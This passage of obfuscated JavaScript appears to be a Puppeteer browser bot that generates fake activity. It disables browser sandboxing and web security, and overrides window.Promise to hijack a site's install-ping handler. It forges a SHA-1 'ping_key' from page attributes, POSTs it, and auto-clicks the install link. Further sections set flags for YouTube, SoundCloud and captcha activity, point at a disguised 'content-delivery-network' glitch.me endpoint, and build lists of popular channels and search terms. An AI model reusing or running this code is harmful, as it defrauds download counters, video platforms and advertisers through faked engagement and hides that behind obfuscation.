              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x2 * -0x41 + -0x335 * 0xa + 0x1fa0; J < 0x3a0 * -0x2 + -0x26d0 + 0x2e60; ++J)
                K = Q[J - (0xbd7 + -0x1cd0 + -0x1 * -0x10fc)] ^ Q[J - (0x1ae4 + 0x1230 + 0x1 * -0x2d0c)] ^ Q[J - (0xa3 * 0x6 + 0x1 * 0xb25 + 0x15b * -0xb)] ^ Q[J - (0xcf2 + 0x1d54 + 0x3 * -0xe12)], Q[J] = K << -0x24d1 + -0x59 * 0x4f + 0x4049 | K >>> -0x1f21 + 0x3 * 0xac5 + -0x10f;
              for (J = 0x12b * -0x1 + -0x1e61 * -0x1 + 0x1 * -0x1d36; J < 0x4 * 0x20d + 0x1b81 + -0x23a1; J += 0xd1b * -0x1 + 0x1 * 0x1c37 + 0xf17 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x241c + 0x1bac + -0x3fc3 | L >>> -0x1 * 0xe80 + -0x1901 + 0x279c) + (M & N | ~M & O) + P + (-0x497e579e * -0x2 + 0x1f * -0x9f8f4d + -0x2527db50) + Q[J] << 0x1ee7 + 0x1fd5 * 0x1 + -0x3ebc) << 0x1ade + 0x2641 * -0x1 + 0xb68 | P >>> 0x1dc3 + 0x3e7 * 0x3 + -0x295d) + (L & (M = M << -0x1bbe * 0x1 + 0x54b * 0x1 + 0x1691 | M >>> -0x686 * -0x5 + -0xe0b * 0x2 + 0x2 * -0x243) | ~L & N) + O + (0x2bdf3c5 * 0x1d + -0x7fdb21fd + 0x8ad8fe45) + Q[J + (0x1 * -0x13bd + -0x124 * -0x10 + 0x17e)] << 0x53 * -0x41 + 0x8 * -0x4c1 + -0x3b1b * -0x1) << 0x1 * 0x7c0 + -0xf75 + -0x2 * -0x3dd | O >>> -0x104a + -0x18a * -0x13 + -0xcd9) + (P & (L = L << 0x59d + -0x2 * 0x1f5 + -0x195 | L >>> -0x48c + 0x14 * 0x1cb + -0x1f4e) | ~P & M) + N + (-0x5226aa5f + -0x233 * 0x3228d3 + 0x11af8ec01) + Q[J + (-0x22c * -0x6 + 0x209 + -0xf0f)] << 0x1215 + -0x33f * 0x4 + -0x519) << -0x1ed4 + -0xd95 + 0x2 * 0x1637 | N >>> 0x198c + -0x2c9 + -0x16a8) + (O & (P = P << -0x1 * 0x936 + -0x1 * 0x9c2 + 0x1316 | P >>> 0x488 + 0x1223 + -0x1 * 0x16a9) | ~O & L) + M + (-0xc * 0xa35838d + 0x3b3 * 0x20cf11 + -0x6 * -0xf467163) + Q[J + (0xc * -0x76 + 0x982 * -0x1 + 0xf0d)] << 0x5 * -0x5c9 + 0x5 * -0x3dd + 0x3b6 * 0xd) << 0x1 * -0x1535 + -0x34a + 0x1884 | M >>> -0x64b + -0x4a6 * 0x4 + 0x18fe) + (N & (O = O << -0x2 * 0xd7d + 0x367 * 0x8 + -0x20 | O >>> 0x1b5a + 0x179d + 0x32f5 * -0x1) | ~N & P) + L + (0x78c229ab + -0x8a0c8f * 0x5 + -0x1 * 0x1b8d7147) + Q[J + (0x373 * -0x1 + -0x1765 + 0x1adc)] << 0x58e * -0x1 + -0x2027 * 0x1 + 0x25b5, N = N << 0x1 * -0x1073 + -0x1 * 0x1483 + 0x71 * 0x54 | N >>> -0xe86 + -0x99 * -0x19 + -0x69;
              for (; J < 0x2 * -0x492 + -0x1e0b + 0x2757; J += -0x22 * -0x120 + 0x3cf * 0x4 + 0x1 * -0x3577)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x6d * 0x56 + 0x1e95 + 0x60e | L >>> -0x823 + 0x1ef8 + -0x16ba) + (M ^ N ^ O) + P + (0x7c3bcee6 * 0x1 + 0x26417a3b * -0x3 + 0x65628b6c) + Q[J] << -0x472 * -0x1 + 0x12 * 0x41 + -0x904) << -0x122c + 0x1157 + -0x1 * -0xda | P >>> 0x2255 + 0x191 * -0x18 + 0x35e) + (L ^ (M = M << 0x5 * 0x5e2 + 0xd * -0x1 + -0x1d3f | M >>> -0xc32 * -0x2 + -0x6bc * -0x5 + 0x2 * -0x1d07) ^ N) + O + (-0xa9218bbe + 0x10 * 0xb9d2ccb + 0x5e28aaaf) + Q[J + (0x17 * 0x189 + 0x24e3 * 0x1 + -0x4831)] << 0x162a + 0x10f0 + -0x302 * 0xd) << 0x16d9 + 0x201c + -0x4 * 0xdbc | O >>> -0xc42 + 0xc14 * -0x2 + 0x1 * 0x2485) + (P ^ (L = L << -0x1952 + 0x1bd * 0x2 + 0x15f6 | L >>> 0xccb + -0x1 * 0x2dd + -0x9ec) ^ M) + N + (-0xe70a * -0x3343 + -0x1a522 * -0x75c2 + -0x812137c1) + Q[J + (-0x246b * 0x1 + -0x2563 + 0x49d0)] << -0x147f + -0x17b * -0xb + 0x436) << -0x3 * 0x56d + 0xd * -0x1df + 0x289f | N >>> 0x1cd0 + -0x795 + -0x1520) + (O ^ (P = P << 0x16ff + 0x2414 + -0x3af5 | P >>> -0x1d53 + -0x22d6 + 0x402b) ^ L) + M + (-0xc58 * -0x2377c + 0x9 * -0xa661add + 0xb113fac6) + Q[J + (-0x3af * 0x5 + 0x19 * -0x1f + -0x727 * -0x3)] << -0x15c9 + 0xb * -0x31 + 0x17e4) << 0x7 * 0x163 + 0x8 * 0x1de + -0x2 * 0xc50 | M >>> 0x65e + 0x102b + -0x6 * 0x3bd) + (N ^ (O = O << -0x1dd * 0x1 + -0x14c + 0x347 | O >>> 0xbf0 * -0x2 + -0x1 * 0x259d + 0x3d7f) ^ P) + L + (0xc * 0x8102573 + 0x9eff0172 + -0x90e6d735) + Q[J + (0x25ac + -0xac9 + -0x8f5 * 0x3)] << 0x89 + -0x2 * 0xa47 + 0x5 * 0x401, N = N << 0x28f * -0x5 + -0xe0 * 0x29 + 0x1 * 0x30c9 | N >>> 0x11a8 + 0x743 * -0x1 + -0xa63;
              for (; J < 0x891 + 0x1353 + -0x1ba8; J += 0x1e93 + -0x75b * -0x1 + 0xca3 * -0x3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0xa13 + -0x1aa7 * -0x1 + 0x1 * -0x24b5 | L >>> 0xbfb * 0x3 + -0x153 + 0x1f * -0x11d) + (M & N | M & O | N & O) + P - (0x31423d + -0x1 * -0x316483ee + -0x151 * -0x301729) + Q[J] << 0x784 + -0xfca + 0x846) << -0x137 * 0xa + -0x72 + 0xc9d | P >>> -0x1f * -0x6b + -0x321 * -0x1 + -0xffb) + (L & (M = M << -0x279 * 0xd + 0xd * 0x26b + 0x1 * 0xd4 | M >>> -0x2104 + -0xcac * -0x1 + 0x145a) | L & N | M & N) + O - (-0xb1765827 + 0xcd45587c + -0x68b7b4b * -0xd) + Q[J + (0x5a * 0x65 + -0x206a * 0x1 + -0x7 * 0x71)] << -0x2100 + -0x3 * 0x964 + 0x3d2c) << -0x4d6 * -0x3 + 0xcd2 + 0x1 * -0x1b4f | O >>> -0x14b1 + 0x2572 + 0x853 * -0x2) + (P & (L = L << 0x2585 + -0x16 * 0x103 + -0xf25 | L >>> 0x12b6 + 0x1 * 0x1f22 + 0x2 * -0x18eb) | P & M | L & M) + N - (-0x502 * 0x12271d + -0xbbba5d85 * -0x1 + 0x1011c4d9) + Q[J + (0x1ce7 + 0x180a + -0x34ef)] << 0x2386 + -0xdb9 + -0x15cd) << -0x1 * -0xfe0 + -0x100d + 0x32 | N >>> -0x6 * 0x5cf + -0x1284 * 0x1 + 0x3579) + (O & (P = P << -0x1459 * -0x1 + 0x1 * 0x18d1 + -0x2d0c | P >>> 0xa46 + -0x1010 + -0xd4 * -0x7) | O & L | P & L) + M - (-0x51 * 0x21df7bb + 0x6713e775 * 0x2 + 0x4e37d665) + Q[J + (-0x11d8 + 0x35 * 0xe + 0xef5)] << -0x714 + 0x2 * -0xc52 + 0x1fb8) << 0x1a51 * 0x1 + -0xc * 0x80 + -0x144c | M >>> -0x1 * 0xa61 + 0xcb1 + -0x235) + (N & (O = O << -0x46 * -0x19 + 0x1bbc + -0x2274 | O >>> -0x164b + 0x31 * -0xbc + 0x2b * 0x15b) | N & P | O & P) + L - (-0xa31098b1 + 0x67405765 + 0xacb48470) + Q[J + (0x192 * -0x4 + -0x83f + 0x1 * 0xe8b)] << 0x2 * 0x426 + -0x26cf + 0x1e83, N = N << -0x16 * -0x1b5 + 0x137e + -0x38ee | N >>> 0x1685 + 0x1b29 * 0x1 + -0x31ac;
              for (; J < -0x1196 + -0x313 * -0x9 + -0x9c5; J += -0x58 * -0x2f + -0x1b0b + 0x8 * 0x15d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2702 + -0xbee * 0x2 + -0xf21 * 0x1 | L >>> 0x415 + 0x2 * -0x1355 + -0xb90 * -0x3) + (M ^ N ^ O) + P - (-0x1df70b * -0x17f + 0x37981adb + -0x2ecf7626) + Q[J] << -0xfa1 * 0x1 + -0x1 * 0x1285 + -0x2f * -0xba) << -0x526 + 0x170f * -0x1 + 0x1c3a | P >>> 0x2 * 0xaab + 0x14c * 0x8 + -0x1f * 0x105) + (L ^ (M = M << -0xb7f + 0x923 * -0x3 + -0x29a * -0xf | M >>> -0x330 + 0x25b0 + 0x5 * -0x6e6) ^ N) + O - (-0x220dfbf0 + -0x18c17a86 * -0x1 + 0x2 * 0x1f74dfca) + Q[J + (0x1aa * 0x12 + -0x6d * 0x10 + -0x1723 * 0x1)] << 0x24a * 0x9 + -0x22bf + 0xe25) << -0x1a0b + 0x22 * 0x11f + -0xc0e | O >>> -0x2468 + 0x165e + 0xe25 * 0x1) + (P ^ (L = L << -0xbab * -0x1 + 0x1655 + -0x21e2 | L >>> 0x1353 + -0xc5 * 0x21 + 0x614) ^ M) + N - (-0x4b6a41b3 + -0x2e * -0x1cfcfdf + 0x2db025cb) + Q[J + (0x1bd7 + -0x1 * 0xa3d + -0x4 * 0x466)] << -0x6cb + 0x22ee + -0x1c23) << -0x1d36 + 0x52d + 0xc07 * 0x2 | N >>> 0x1e66 + -0x988 + -0x5 * 0x427) + (O ^ (P = P << -0x1a5 * 0x13 + -0x220e + -0x1 * -0x416b | P >>> -0x2158 + -0x1ccd * -0x1 + 0x48d) ^ L) + M - (0xce5 * 0x43935 + 0x34b1f90e + -0x4f * 0xad7fa3) + Q[J + (0x1480 + 0x6bc * -0x5 + 0x2a3 * 0x5)] << -0x2566 + 0x397 + 0x6c3 * 0x5) << -0x209 + -0x1 * -0x1bc5 + -0x19b7 | M >>> -0x1916 + -0x1b7 * -0xb + 0x654) + (N ^ (O = O << 0x221f * -0x1 + 0x1a68 + -0x191 * -0x5 | O >>> -0x7ed * 0x1 + 0x19c6 * 0x1 + -0x1 * 0x11d7) ^ P) + L - (0xf8b * 0x617c5 + -0x1c482c83 + -0x5 * 0x28f9b42) + Q[J + (-0x2 * 0x514 + 0x14ac + -0xa80)] << 0x147 * -0x3 + -0x1 * -0xe41 + -0xa6c * 0x1, N = N << -0x1567 * 0x1 + 0x25 * 0x82 + -0x3 * -0xe9 | N >>> -0x1 * 0x2385 + -0x1b5f + 0x61 * 0xa6;
              this['h0'] = this['h0'] + L << -0x235c + -0xdf * -0xb + -0x19c7 * -0x1, this['h1'] = this['h1'] + M << 0x5 * 0x13d + -0x1391 + 0xd60, this['h2'] = this['h2'] + N << 0xcd8 + -0x3d + 0x7 * -0x1cd, this['h3'] = this['h3'] + O << -0x2668 + 0x2196 + 0x4d2, this['h4'] = this['h4'] + P << -0x1 * 0x11b6 + -0xc6f * -0x1 + 0x547;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1 * -0x2fd + 0x3 * -0x8a5 + 0x8 * 0x3a1 & 0x4 * -0x63b + -0x20b * -0x4 + 0x10cf] + w[J >> 0xf * -0x145 + 0x18c + -0x1 * -0x1197 & 0x53f * -0x5 + -0x1844 * 0x1 + 0x86d * 0x6] + w[J >> 0x6e8 + 0x1f * -0x71 + -0xf * -0x75 & 0x115d + 0x3 * 0xb99 + -0x3419] + w[J >> 0x18b * 0x6 + -0x1 * 0xa52 + 0x120 & 0x1172 + -0x85a * -0x4 + -0x1 * 0x32cb] + w[J >> -0x5 * -0x62a + -0x22 * 0x47 + 0x8 * -0x2ab & -0x15a7 + -0xe24 + 0x23da] + w[J >> -0x23b0 + -0xce + -0x22 * -0x113 & -0x9 * -0x53 + -0x16cf + 0x1 * 0x13f3] + w[J >> -0x20ab + -0x59 * 0xf + 0x25e6 & -0x2223 + -0x2f * 0x2e + 0x1 * 0x2aa4] + w[0x224 * -0x8 + 0xb * 0x347 + 0x69 * -0x2e & J] + w[K >> -0xb2c + -0x2 * 0xacf + 0x20e6 & -0x2469 + 0x1 * 0x19ed + 0xa8b] + w[K >> 0x1 * 0x10ed + 0x104f + -0x2124 & -0x45 * -0x71 + 0xfb3 * -0x1 + -0x35 * 0x47] + w[K >> 0x37 * -0x9b + -0x8a9 + 0x2a0a & -0x2616 + 0x2cb + 0x235a] + w[K >> 0x1 * -0x53b + -0x1 * -0xf09 + -0x9be & -0x198a + -0x1160 + -0x243 * -0x13] + w[K >> 0x2654 + -0xa87 + -0x1bc1 & -0x295 * 0x1 + 0x1 * -0x1671 + 0x1915] + w[K >> 0x47 * 0x2e + 0x5ce * 0x3 + -0x1e24 & 0x182a + 0x1240 + 0x2a5b * -0x1] + w[K >> -0x2af + 0xcc9 + -0x1 * 0xa16 & 0x1ea8 + 0x1faf + -0x7c9 * 0x8] + w[-0x2 * -0x193 + -0x6d * -0x2b + -0x1566 & K] + w[L >> 0x3 * 0x351 + -0x1ed2 + 0x14fb & 0x2 * 0xe92 + 0x63d * -0x5 + -0x12 * -0x1e] + w[L >> 0x187e + -0x9d * -0x2 + -0x334 * 0x8 & 0x5c2 + 0x266b + 0x2 * -0x160f] + w[L >> -0x6 * -0x53e + -0x8 * 0xa6 + -0x1a30 & 0x201f + -0x1 * 0x13a3 + -0x1 * 0xc6d] + w[L >> 0x1 * -0xa88 + 0xa * -0x15d + -0x2 * -0xc1d & -0x39c + -0x1 * 0xd5a + 0x1 * 0x1105] + w[L >> 0x25a6 + -0x23f1 + -0x1a9 & 0x531 + -0x159b * 0x1 + -0x1 * -0x1079] + w[L >> -0x1a6 * 0x8 + -0x7e0 + -0x36 * -0x64 & -0x50 * 0x2b + 0x1 * -0x1093 + -0xf09 * -0x2] + w[L >> 0x1 * -0x18ad + -0xe * -0x2a1 + -0xc1d & 0x5 * -0x51b + -0x1d0 * 0x11 + 0x3866] + w[-0x2c0 + -0x6e3 + -0x92 * -0x11 & L] + w[M >> 0x2173 * 0x1 + -0x4 * -0x415 + -0x31ab & -0x50 * -0x73 + 0x6 * 0x143 + -0x31 * 0xe3] + w[M >> -0x1 * 0x1709 + 0xa9c + 0x1 * 0xc85 & 0x9fb + -0x20f1 + 0x1705] + w[M >> 0x10d6 + 0x1670 + -0x2732 & -0xd * 0xca + -0x1 * -0x1c13 + -0x1 * 0x11c2] + w[M >> 0x13b7 + 0xdda + 0x1 * -0x2181 & 0x8ca + -0xbf * -0x21 + -0x215a] + w[M >> -0x1604 + 0x469 + 0x11a7 & 0x1 * 0x2463 + 0x4cf * -0x5 + -0xb9 * 0x11] + w[M >> -0x6a8 + 0x6bc * -0x2 + -0xd7 * -0x18 & -0xe4d + -0x1aa6 + 0xb5 * 0x3a] + w[M >> 0xd3 * -0x4 + -0x57 + 0x3a7 & -0x105e + -0x110f + 0x217c] + w[0x2181 + 0x157b + -0x147 * 0x2b & M] + w[N >> 0x1 * -0x2551 + -0x6 * 0xfb + 0x2b4f * 0x1 & -0x1a74 + -0x642 + 0x20c5 * 0x1] + w[N >> -0x2437 + 0xb2a + 0x1925 & 0x225d + -0x1a58 + -0x7f6] + w[N >> 0x205f * 0x1 + 0x22c5 + -0x431 * 0x10 & -0x16b3 + 0x1c03 + 0x1 * -0x541] + w[N >> -0xa4d + -0x11e2 + 0x1 * 0x1c3f & -0xc1f + 0x2 * 0x24a + 0x1 * 0x79a] + w[N >> -0x5b4 + -0x23f3 + 0x29b3 & -0x42f * 0x9 + -0xc01 + 0x31b7] + w[N >> -0xb * -0x219 + -0x12cf + -0x43c & -0x158d + 0x14b + 0x1451] + w[N >> -0x1950 + -0xeb0 + -0x1 * -0x2804 & 0x1e9 * -0x13 + -0x21 * -0xa9 + 0xe91] + w[0x1 * -0x1381 + -0x29e * -0x6 + 0x3dc & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x225b + 0xac1 + -0x2d04 & 0x1 * -0x204d + 0x11e0 * -0x2 + 0x450c,
                J >> 0x2129 + 0x234a + -0x9c5 * 0x7 & 0x1 * -0x2292 + -0x1 * -0x347 + 0x204a,
                J >> 0x2089 + 0x3f4 + -0x3d * 0x99 & -0x18d2 + 0x1 * 0x123f + 0x13 * 0x66,
                0x4de * 0x1 + 0x3fa * -0x1 + 0x1b & J,
                K >> -0x2 * -0x6c1 + 0x126c + 0x2 * -0xfeb & 0x3 * 0x4cd + 0x1717 + 0x247f * -0x1,
                K >> 0x886 + -0xc7 + -0x7af & 0xb66 * -0x2 + 0xfbf + 0x80c,
                K >> -0x86c + 0x207 * -0x4 + 0xa * 0x1a8 & -0x232e + 0x25a * -0x9 + -0x131d * -0x3,
                -0x10da + -0x100f * -0x1 + 0x1ca & K,
                L >> 0x1e8f + 0x1be5 + -0x3a5c & -0x99f + 0x1 * 0x91e + 0x180,
                L >> -0xbc * -0xb + 0x3 * 0x2af + 0x9 * -0x1c9 & 0x2490 + -0x2137 + -0x25a,
                L >> -0x1141 + -0xd3e + 0x1e87 & -0x784 + -0x5 * 0x404 + 0x1c97,
                -0x331 + 0x21b4 + -0x761 * 0x4 & L,
                M >> -0x71 * 0x24 + -0xb96 + 0x1b92 & -0xe2b + -0x1 * 0x2b9 + 0x11e3,
                M >> 0xea2 * 0x1 + 0x1844 + 0x6 * -0x679 & -0x242 + 0x21e4 + -0xb * 0x2c9,
                M >> 0x22b7 + 0x3ab + 0x1 * -0x265a & 0xd04 * -0x1 + 0x1 * -0x1e32 + 0x2c35 * 0x1,
                -0x1c38 + 0x4 * 0x6b2 + 0x26f & M,
                N >> 0xfb * -0x1a + -0x4 * -0x1c5 + 0x1282 & 0xc6d + 0x1b17 + -0x2685,
                N >> 0x10f * 0x7 + 0x18e * -0x1 + -0x5cb & -0x86b + 0x258 + -0x16a * -0x5,
                N >> -0x1fcc + -0xe53 * -0x2 + -0x2 * -0x197 & -0x1 * -0x13d2 + -0x1 * -0x25c1 + -0x3894,
                -0x526 * 0x3 + -0x7 * -0x3be + -0x9c1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1613 + -0x931 + -0x2 * 0x667), (K = new DataView(J))['setUint32'](-0x4 * 0x51 + -0x1532 + -0xa * -0x23f, this['h0']), K['setUint32'](0xb * 0x77 + 0x265c + -0x2b75, this['h1']), K['setUint32'](-0xcc8 + -0x926 + 0x15f6, this['h2']), K['setUint32'](-0x88 + 0x13e7 + -0x1353 * 0x1, this['h3']), K['setUint32'](-0x2498 + 0x1901 * 0x1 + -0x13 * -0x9d, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1 * 0xe31 + 0x1 * 0x1622 + -0x1 * 0x2453];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x2244 + 0x1 * 0x1d16 + -0x33 * 0x13e;
            J[0x19 * 0x17e + 0x957 + -0x2ea5]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x14f8 + -0xb5d + 0x2055] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x2263 * 0x1 + -0x131a * -0x2 + -0x3d0), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1a91 + 0x4 * -0x26 + -0x7a * -0x39;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1e32 + -0x157f * 0x1 + -0x2d7 * 0x1), Promise['resolve'](-0x85d + 0x1bdc + -0x137e);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x2540 + -0x134b + -0x11f5; j < 0xa * 0x164 + 0x21fc + -0x215 * 0x17; j++)
    i();
}

function a() {
  const bn = [
    '2%91%E6%92',
    '__searchBo',
    'prototype',
    'W5X1nCoNW5bOzu1QvG',
    '9DshU55EiV',
    '.l-listen-',
    'AwDUzwqTzxHJAa',
    'Kit/537.36',
    'JvlPjRUdId',
    'W5hcSHvRpW',
    'W6Pncx/cMGS',
    'Bw9VBw9VlMLVia',
    'WPDUwMPbWOjoWONdLmkB',
    'D3nLCG',
    'zwfZDcb0zwfTla',
    '/Zren/Resi',
    'MSgZhNCwff',
    'Ahr0Chm6lY9NCG',
    'ML,\x20like\x20G',
    'v8kjbSokW7pdMSoZrceX',
    '-anti-anti',
    'CMCVzw4VC2nYAq'
  ];
  a = function() {
    return bn;
  };
  return a();
}
const NETWORK_PATIENCE = 0x3dd8 + -0x2 * -0x1f2a + -0x5cec + (-0x1bc5 + -0x497 + 0x2c14) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0xbbd * -0x1 + -0x2a5 + -0x915) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0xe * 0x22d + 0x7 * -0x5 + -0x1e53);
    let h = e[f];
    if (b['VomhbJ'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1594 + 0x3fa + 0x2 * 0x8cd, s, t, u = 0x1130 + 0x88d + -0x1 * 0x19bd; t = n['charAt'](u++); ~t && (s = r % (-0x1265 * 0x1 + -0x2 * -0x3d3 + 0xac3) ? s * (-0x22d9 + 0x2504 + -0x1eb) + t : t, r++ % (-0x3d * 0x1 + 0x1 * -0x2441 + -0x1 * -0x2482)) ? p += String['fromCharCode'](-0x167e + 0x23 * -0x3f + 0x201a & s >> (-(0x1ab3 * -0x1 + 0x53c * 0x5 + 0x89) * r & -0x137c + 0x1633 + -0x2b1)) : -0xabb + 0x4af * 0x5 + -0xcb0) {
          t = o['indexOf'](t);
        }
        for (let v = -0x12 * 0x1c9 + -0x1e0b + 0x1 * 0x3e2d, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x176c + -0x17de + 0x13f * 0x26))['slice'](-(0xc * 0xdf + 0xb57 * 0x1 + -0x15c9));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0xefa + -0x36f * -0x7 + 0x1 * -0x2703,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1e53 + 0x3 * 0x63e + 0xb99; u < -0x2 * -0xf52 + -0x2444 + 0x6a0; u++) {
          p[u] = u;
        }
        for (u = -0x1023 + -0x1 * -0x3b9 + 0xc6a; u < -0x1 * -0xe7f + 0x8e * -0x3e + 0x14e5; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x13d * 0x1b + 0x2 * -0x11cd + 0x32b), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x10f8 + 0x141 * 0x1f + -0xf * 0x3b9, q = -0x1852 + -0x43 * -0x28 + 0xdda;
        for (let v = 0xc89 + -0x3bf * -0xa + -0x1 * 0x31ff; v < n['length']; v++) {
          u = (u + (0x1 * -0xe45 + -0x66a * 0x1 + 0x14b0)) % (-0x10 * 0x29 + 0x3 * 0x529 + -0x3f9 * 0x3), q = (q + p[u]) % (0x3 * 0x583 + -0xb97 + -0x65 * 0xa), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1 * -0x60b + -0x23 * 0x89 + 0x2 * 0xce3)]);
        }
        return t;
      };
      b['cGMPFG'] = m, c = arguments, b['VomhbJ'] = !![];
    }
    const j = e[0x20b2 + -0x204f + -0x63],
      k = f + j,
      l = c[k];
    return !l ? (b['GKozmc'] === undefined && (b['GKozmc'] = !![]), h = b['cGMPFG'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
((() => {
  const W = d;
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x2 * -0xc88 + 0x1f * 0x121 + -0x9ef; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array[W(0x2)]['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + X(0xb) + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + X(0xe) + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 